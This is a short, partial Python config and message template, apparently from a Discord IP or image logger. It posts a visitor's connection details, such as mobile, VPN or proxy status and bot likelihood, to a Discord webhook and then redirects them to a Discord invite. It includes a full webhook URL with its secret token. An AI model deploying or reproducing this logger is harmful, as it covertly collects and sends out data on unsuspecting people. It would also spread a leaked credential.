...
config = {
    # BASE CONFIG #
    "webhook": "https://canary.discord.com/api/webhooks/1152665152202752070/uZrkBBTanb1yv6gJ1g0It3H9Dh97JMwlKhXUm3sCjFmRS2L8KwsFRhqr10MpyfeULQhk",
    ...
    "color": 0xCC0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
    ...
    "redirect": {
        ...
        "page": "https://discord.gg/redliferp" # Link to the webpage to redirect to 
    },
...
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'True'}`
